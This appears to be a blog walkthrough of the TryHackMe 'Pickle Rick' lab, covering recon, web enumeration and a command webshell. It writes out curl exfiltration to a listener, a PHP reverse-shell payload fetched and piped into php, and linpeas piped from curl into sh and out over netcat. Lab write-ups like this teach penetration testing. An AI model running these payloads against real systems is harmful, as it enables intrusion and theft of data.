## You gotta get schwifty in here!

You will encounter this box naturally when doing the [Complete Beginner Path](https://tryhackme.com/path/outline/beginner) on TryHackMe. By the time you approach this you should possess enough skill set to know what to **research** for and get the flags.

> This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

Learn more from additional readings found at the end of the article. I would be thankful if you mention me when using parts of this article in your work. Enjoy!

***
# Contents

1. [Basic Information](#basic-information)
2. [Target of Evaluation](#target-of-evaluation)
3. [Recon](#recon)
4. [Additional readings](#additional-readings)
***

# Basic Information

| #     |   |
|:--    |:--|
| Type    |Beginner Box
|Name    | **Try Hack Me / Pickle Rick**
|Started | 2021/05/06
|URLs    | https://tryhackme.com/room/picklerick
|Author  | **Asentinn** / OkabeRintaro
|       | [https://ctftime.org/team/152207](https://ctftime.org/team/152207)

%%[bmac-button]

# Target of Evaluation

We are given the IP as a target of evaluation:

* `10.10.124.36`

# Recon

I'm running `nmap` scan combined with Exploit-DB search with `searchsploit`:

> `-A`: OS detection, version detection, script scanning, and traceroute

> `-p-`: all ports

```text
$ nmap -A -p- 10.10.124.36 -oX nmap_initial.xml

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-06 23:25 CEST
Nmap scan report for 10.10.124.36
Host is up (0.048s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9c:29:54:49:94:ec:27:2a:68:9e:18:0f:6b:37:1f:39 (RSA)
|   256 8f:06:a2:ef:34:08:e7:cd:2d:bc:85:4f:5d:f0:5f:0d (ECDSA)
|_  256 ea:ab:a5:0a:ea:60:ee:9c:c8:6c:3b:84:79:ef:c6:aa (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.82 seconds

```

```text
$ searchsploit --nmap nmap_initial.xml

[i] SearchSploit's XML mode (without verbose enabled).   To enable: searchsploit -v --xml...
[i] Reading: 'nmap_initial.xml'

[-] Skipping term: ssh   (Term is too general. Please re-search manually: /usr/bin/searchsploit -t ssh)

[i] /usr/bin/searchsploit -t openssh
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation                 | linux/remote/6094.txt
Dropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of Service                   | multiple/dos/1572.pl
FreeBSD OpenSSH 3.5p1 - Remote Command Execution                                     | freebsd/remote/17462.txt
glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read                               | linux/local/258.sh
Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                   | novell/dos/14866.txt
OpenSSH 1.2 - '.scp' File Create/Overwrite                                           | linux/remote/20253.sh
OpenSSH 2.3 < 7.7 - Username Enumeration                                             | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                       | linux/remote/45210.py
OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                                    | unix/remote/21314.txt
OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                           | linux/remote/21402.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                                 | unix/remote/21578.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                                 | unix/remote/21579.txt
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                           | multiple/dos/2444.sh
OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation                                 | linux/local/41173.c
OpenSSH 7.2 - Denial of Service                                                      | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                              | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                 | linux/remote/40136.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                         | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                               | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Priv | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                             | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                 | linux/remote/45939.py
OpenSSH SCP Client - Write Arbitrary Files                                           | multiple/remote/46516.py
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                                  | linux/remote/26.sh
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                                    | linux/remote/25.c
OpenSSHd 7.2p2 - Username Enumeration                                                | linux/remote/40113.txt
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                                 | multiple/remote/3303.sh
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


[-] Skipping term: http   (Term is too general. Please re-search manually: /usr/bin/searchsploit -t http)

[i] /usr/bin/searchsploit -t apache httpd
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
Apache 0.8.x/1.0.x / NCSA HTTPd 1.x - 'test-cgi' Directory Listing                   | cgi/remote/20435.txt
Apache 1.1 / NCSA HTTPd 1.5.2 / Netscape Server 1.12/1.1/2.0 - a nph-test-cgi        | multiple/dos/19536.txt
Apache Httpd mod_proxy - Error Page Cross-Site Scripting                             | multiple/webapps/47688.md
Apache Httpd mod_rewrite - Open Redirects                                            | multiple/webapps/47689.md
NCSA 1.3/1.4.x/1.5 / Apache HTTPd 0.8.11/0.8.14 - ScriptAlias Source Retrieval       | multiple/remote/20595.txt
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

So two open ports (SSH and a website), with potential user enumeration on OpenSSH 7.2p2. Let's try to poke the SSH a bit and then see what port 80 have for us.

## SSH (:22)

```text
$ ssh R1ckRul3s@10.10.124.36

The authenticity of host '10.10.124.36 (10.10.124.36)' can't be established.
ECDSA key fingerprint is SHA256:CcPfyPpsT6IYu/4wh+7foN+W+ldjBeH/SYo8poMPfps.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.124.36' (ECDSA) to the list of known hosts.
R1ckRul3s@10.10.124.36: Permission denied (publickey).
```

After that command, I tried to override public key check, without removing it from the keychain on my machine.

```
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no R1ckRul3s@10.10.124.36
```

I've tried a few blank shots with passwords from _Rick & Morty_ universe unsuccessfully.

## Website (:80)

![pr_80.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621970740228/Q_-hn3PXB.png)

In the source code:

```html
 <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
```

And running both `gobuster` and `nikto`:

```text
$ gobuster dir -w /usr/wl/dirbuster-m.txt -u http://10.10.124.36/

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.124.36/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/wl/dirbuster-m.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/06 23:31:57 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.10.124.36/assets/]
/server-status        (Status: 403) [Size: 300]                                  
                                                                                 
===============================================================
2021/05/06 23:50:48 Finished
===============================================================
```

```text
$ nikto -o nikto.txt -h 10.10.124.36

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.124.36
+ Target Hostname:    10.10.124.36
+ Target Port:        80
+ Start Time:         2021-05-07 00:08:30 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-05-07 00:16:51 (GMT2) (501 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

Nikto found a `/login.php` page.

> 🔔 `CyberEthical.Me` is maintained purely from your donations - if you would like to boost the community, consider one-time sponsoring at the 🍻 [Buymeacoffee](https://www.buymeacoffee.com/asentinn) or use the [Sponsor](https://blog.cyberethical.me/sponsor) button. 

I was curious why `nikto` found `login.php` and `gobuster` didn't. Well, apparently `gobuster dir` have an additional parameter that can be used to enumerate files.

```text
-x, --extensions string               File extension(s) to search for
```

So lets run it again:

```sh
─$ gobuster dir -w /usr/wl/dirbuster-m.txt -x php,txt,md,db,bak -u http://10.10.124.36
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.124.36
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/wl/dirbuster-m.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,md,db,bak
[+] Timeout:                 10s
===============================================================
2021/05/08 18:31:09 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 313] [--> http://10.10.124.36/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]                   
/robots.txt           (Status: 200) [Size: 17]  
```

Bum, right away. `portal.php` redirects to `login.php`, but:

```sh
$ curl http://10.10.124.36/robots.txt

Wubbalubbadubdub
```

Using `R1ckRul3s/Wubbalubbadubdub` credentials I can successfully authorize on `login.php`.

![pr_portal.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621970938776/TlY6RyJbJ.png)

I'm firing up `burpsuite` to map the site as I'm going through.

![pr_denied.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621970956559/f1fSU-FXx.png)

Uhm... We have access "only" to commands tab.

![pr_command_whoami.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621970973874/pVbRK9nm5.png)

All right! Webshell as `www-data` user.

Let's fire up `netcat` and see if we can [curl](https://blog.cyberethical.me/linpeas) that out (`cat` is disabled via that webshell)

```sh
# Webshell
curl --data-binary @Sup3rS3cretPickl3Ingred.txt 10.XX.XX.XXX:443
```

```sh
# Local
$ nc -lvnp 443                                           

listening on [any] 443 ...
connect to [10.XX.XX.XXX] from (UNKNOWN) [10.10.124.36] 56886
POST / HTTP/1.1
Host: 10.XX.XX.XXX:443
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 17
Content-Type: application/x-www-form-urlencoded

/FIRST FLAG CUT/
```

And also the `clue.txt`:

```sh
# Webshell
curl --data-binary @clue.txt 10.XX.XX.XXX:443
```

```sh
# Local
$ nc -lvnp 443

listening on [any] 443 ...
connect to [10.XX.XX.XXX] from (UNKNOWN) [10.10.124.36] 56894
POST / HTTP/1.1
Host: 10.XX.XX.XXX:443
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 54
Content-Type: application/x-www-form-urlencoded

Look around the file system for the other ingredient.
```

Time to get proper shell. Preparing payload:

```php
#pshell.php
<?php
$sock=fsockopen("10.XX.XX.XXX",443);$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Serve it on the python HTTP server:

```sh
$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Start `netcat` to listen for reverse shell:
```text
$ nc -lvnp 443

listening on [any] 443 ...
```

Execute on the web:

```sh
curl 10.XX.XX.XXX/pshell.php | php
```
And on the `netcat` we can see:

```text
$ nc -lvnp 443

listening on [any] 443 ...
connect to [10.XX.XX.XXX] from (UNKNOWN) [10.10.124.36] 57104
/bin/sh: 0: can't access tty; job control turned off
$ ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Semi-stabilize shell (read more in _Additional readings_, "Upgrading Simple Shells"), alias the `ls` for clearer output.

```sh
python -c 'import pty; pty.spawn("/bin/sh")'
alias ls="ls -lah"
```

Little traversing:

```sh
www-data@ip-10-10-212-47:/home/rick$ ls
ls
total 12K
drwxrwxrwx 2 root root 4.0K Feb 10  2019 .
drwxr-xr-x 4 root root 4.0K Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
www-data@ip-10-10-212-47:/home/rick$ cat sec	
cat second\ ingredients 
/SECOND FLAG CUT/
```

Now probably we need to root the box to get the third flag. I'm firing up the `linpeas` using [in-memory execution](https://blog.cyberethical.me/linpeas) with redirecting output to my server.

```
curl 10.XX.XX.XXX/linpeas.sh | sh | nc 10.XX.XX.XXX 9002
```

And bingo:

![pr_sudoer.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1621971099304/6oMowI0mM.png)

You don't always aim for the root itself - you want his permissions, ex. to execute stuff, to enumerate directories. Well, this time simple `www-data` account have these permissions (`www-data` is sudoer). Let's use that.

```sh
www-data@ip-10-10-23-38:/home$ sudo cat ubuntu/.bash_history
sudo cat ubuntu/.bash_history
ll
sudo apt-get install apache2
ls
ls -la
exit
3rd ingredients: /THIRD FLAG CUT/
find / -name php.ini
sudo find / -name php.ini
sudo rm -rf /var/lib/php/session/* 
cat /etc/php/7.0/fpm/php.ini
cat /etc/php/7.0/fpm/php.ini | grep session
cd /var/lib/php/sessions
ls
sudo ls
sudo rm -rf sess_n16aanckg2ifmk12io64o1kfa2
sudo ls
```

> Like what you see? Join the [Hashnode.com](/join) now. Things that are awesome:

>✔ Automatic GitHub Backup

>✔ Write in Markdown

>✔ Free domain mapping

>✔ CDN hosted images

>✔ Free in-built newsletter service

> By using my link you can help me unlock the ambasador role, which cost you nothing and gives me some additional features to support my content creation mojo.


# Additional readings

> 📌 Follow the `#CyberEthical` hashtag on the social media

> 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)

> 👉 Instagram: [@cyber.ethical.me](https://www.instagram.com/cyber.ethical.me/)

> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)

* [linPEAS](https://blog.cyberethical.me/linpeas)
* [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)